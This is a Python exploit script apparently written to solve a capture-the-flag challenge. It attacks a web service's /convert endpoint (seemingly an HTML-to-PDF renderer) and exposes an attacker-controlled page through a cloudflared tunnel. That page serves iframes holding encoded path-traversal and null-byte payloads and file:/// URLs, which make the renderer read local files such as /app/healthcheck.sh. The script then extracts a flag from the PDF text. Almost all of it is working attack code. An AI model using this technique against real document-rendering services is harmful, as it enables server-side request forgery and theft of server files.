import http.server, threading, subprocess, re, time, os, ssl, urllib.request, urllib.parse, urllib.error, pathlib
TARGET=os.environ.get('TARGET','https://89bd5e3214914b0cb088.kit.sasc.tf:443').rstrip('/')
SOURCE=pathlib.Path('/tmp/source.png').read_bytes(); PORT=8765; ORIGIN=''
FLAG=re.compile(rb'kaspersky\{[^}\r\n]{1,240}\}')
P1='/%2e%2e/%2e%2e/%2e%2e/app/tools/index.html%00x'
P2='/%2e%2e/%2e%2e/%2e%2e/app/healthcheck.sh%00x'
class H(http.server.BaseHTTPRequestHandler):
  def log_message(self,*a): pass
  def sendb(self,ct,b):
    self.send_response(200); self.send_header('Content-Type',ct); self.send_header('Content-Length',str(len(b))); self.send_header('Cache-Control','no-store'); self.end_headers(); self.wfile.write(b)
  def do_GET(self):
    global ORIGIN
    p=urllib.parse.urlsplit(self.path).path
    if p=='/source.png': return self.sendb('image/png',SOURCE)
    if p=='/stage1':
      src=ORIGIN+P1; b=(f'<!doctype html><style>html,body{{margin:0}}iframe{{border:0;width:686px;height:175px}}</style><iframe width=686 height=175 src="{src}"></iframe>').encode(); return self.sendb('text/html',b)
    if p=='/stage2':
      src=ORIGIN+P2; b=(f'<!doctype html><style>html,body{{margin:0}}iframe{{border:0;width:686px;height:175px}}</style><iframe width=686 height=175 src="{src}"></iframe>').encode(); return self.sendb('text/html',b)
    if p=='/stage3':
      b=b'<!doctype html><style>html,body{margin:0}iframe{border:0;width:686px;height:175px}</style><iframe width=686 height=175 src="file:///app/tools/index.html"></iframe>'; return self.sendb('text/html',b)
    b=b'<!doctype html><style>html,body{margin:0;width:686px;height:175px;overflow:hidden}img{display:block;width:686px;height:175px}</style><img width=686 height=175 src="/source.png">'; return self.sendb('text/html',b)
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
opener=urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
def get(url,timeout=30):
  with opener.open(urllib.request.Request(url,headers={'User-Agent':'DFO-CTF'}),timeout=timeout) as r: return r.status,dict(r.headers),r.read()
def convert(url,n):
  data=urllib.parse.urlencode({'url':url}).encode(); req=urllib.request.Request(TARGET+'/convert',data=data,headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'DFO-CTF'})
  try:
    with opener.open(req,timeout=55) as r: body=r.read(); st=r.status; hdr=dict(r.headers)
  except urllib.error.HTTPError as e: body=e.read(); st=e.code; hdr=dict(e.headers)
  pathlib.Path(f'/tmp/gen{n}.bin').write_bytes(body); print(f'GEN{n} status={st} bytes={len(body)} ct={hdr.get("Content-Type","")}',flush=True)
  m=FLAG.search(body)
  if m: return m.group().decode()
  if body.startswith(b'%PDF'):
    p=f'/tmp/gen{n}.pdf'; pathlib.Path(p).write_bytes(body)
    try:
      txt=subprocess.check_output(['pdftotext',p,'-'],stderr=subprocess.STDOUT,timeout=10); print('PDFTEXT'+str(n)+': '+txt.decode('utf-8','replace')[:1500].replace('\n',' | '),flush=True); m=FLAG.search(txt)
      if m: return m.group().decode()
    except Exception as e: print('pdftotext error',e,flush=True)
  else: print('BODY'+str(n)+': '+body[:1200].decode('utf-8','replace').replace('\n',' | '),flush=True)
  return None
srv=http.server.ThreadingHTTPServer(('127.0.0.1',PORT),H); threading.Thread(target=srv.serve_forever,daemon=True).start()
cf=subprocess.Popen(['/tmp/cloudflared','tunnel','--url',f'http://127.0.0.1:{PORT}','--no-autoupdate','--protocol','http2'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
deadline=time.time()+45
while time.time()<deadline:
  line=cf.stdout.readline()
  if line:
    print('CF:',line.rstrip(),flush=True); m=re.search(r'https://[a-z0-9-]+\.trycloudflare\.com',line,re.I)
    if m: ORIGIN=m.group(); break
  elif cf.poll() is not None: break
if not ORIGIN: raise SystemExit('NO_TUNNEL')
print('ORIGIN='+ORIGIN,flush=True); st,h,b=get(ORIGIN+'/source.png'); print('TUNNEL_SOURCE',st,len(b),flush=True); assert b==SOURCE
st,h,b=get(TARGET+'/'); print('TARGET_ROOT',st,len(b),flush=True); m=FLAG.search(b)
if m: print('FLAG='+m.group().decode(),flush=True); raise SystemExit(0)
f=convert(ORIGIN+'/stage1?x='+str(time.time_ns()),1)
if f: print('FLAG='+f,flush=True); raise SystemExit(0)
f=convert(ORIGIN+'/stage2?x='+str(time.time_ns()),2)
if f: print('FLAG='+f,flush=True); raise SystemExit(0)
time.sleep(34)
for i in range(3,8):
  f=convert(ORIGIN+'/stage3?x='+str(time.time_ns()),i)
  if f: print('FLAG='+f,flush=True); pathlib.Path('/tmp/FLAG.txt').write_text(f+'\n'); raise SystemExit(0)
  time.sleep(12)
raise SystemExit('FLAG_NOT_FOUND')
